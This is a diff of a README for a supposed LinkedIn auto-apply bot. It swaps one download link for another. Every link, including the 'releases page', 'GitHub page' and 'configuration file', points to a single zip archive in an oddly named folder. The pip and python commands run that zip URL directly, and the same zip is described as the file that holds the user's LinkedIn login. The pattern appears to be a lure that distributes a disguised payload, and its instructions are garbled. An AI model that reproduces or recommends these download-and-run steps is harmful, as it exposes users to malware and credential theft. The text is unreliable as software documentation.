@@ -1,7 +1,7 @@
 # 🤖 linkedin-playwright-auto-job-application-agent - Effortlessly Automate Your Job Applications
 
 ## 📥 Download Now
-[![Download Here](https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip)](https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip)
+[![Download Here](https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip)](https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the LinkedIn Playwright Auto Job Application Agent! This tool helps you automatically apply for jobs on LinkedIn, saving you time and effort. 
@@ -19,12 +19,12 @@ Before you start, ensure your system meets the following requirements:
 - Internet connection for job application access.
 
 ## 📋 Installation Instructions
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip).
 2. **Download the Latest Version**: Find the latest version available and click the link to download.
 3. **Extract the Files**: Once downloaded, extract the ZIP file to a folder on your computer.
 
 ## 📌 Download & Install
-To download the application, [visit this page to download](https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip).
+To download the application, [visit this page to download](https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip).
 
 ### 📂 Running the Application
 1. **Open Your Terminal or Command Prompt**:
@@ -40,18 +40,18 @@ To download the application, [visit this page to download](https://raw.githubuse
 
 3. **Install Required Packages**: Run the following command to install necessary Python packages:
    ```
-   pip install -r https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip
+   pip install -r https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip
    ```
 
 4. **Launch the Application**: To start the automated job application process, run:
    ```
-   python https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip
+   python https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip
    ```
 
 ## 🛠️ Configuring Your Automation
 To customize the application, you need to set your preferences. Follow these steps:
 
-1. **Edit Configuration File**: Open the `https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip` file in a text editor. Here you can specify:
+1. **Edit Configuration File**: Open the `https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip` file in a text editor. Here you can specify:
    - Your LinkedIn login credentials (ensure you change each placeholder).
    - The specific job titles you want to apply for.
    - The maximum number of applications to submit in one session.
@@ -66,11 +66,11 @@ To customize the application, you need to set your preferences. Follow these ste
 ## 👩‍💻 Troubleshooting
 If you encounter issues while using the application, consider the following solutions:
 
-- **Login Issues**: Make sure your credentials in the `https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip` file are correct.
+- **Login Issues**: Make sure your credentials in the `https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip` file are correct.
 - **Failed Applications**: Check if LinkedIn has changed its application interface, which may require updates to the application.
 - **Dependencies**: Ensure all required Python packages are installed.
 
 ## 📞 Support
-For inquiries or assistance, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/main/unlassoed/linkedin_agent_job_application_playwright_auto_v3.5.zip). Our community can help resolve any questions you may have.
+For inquiries or assistance, feel free to open an issue on our [GitHub page](https://github.com/FacundoNimes/linkedin-playwright-auto-job-application-agent/raw/refs/heads/main/unlassoed/job-application-linkedin-playwright-auto-agent-v1.1.zip). Our community can help resolve any questions you may have.
 
 Thank you for using the LinkedIn Playwright Auto Job Application Agent! Enjoy the convenience of applying for jobs effortlessly.
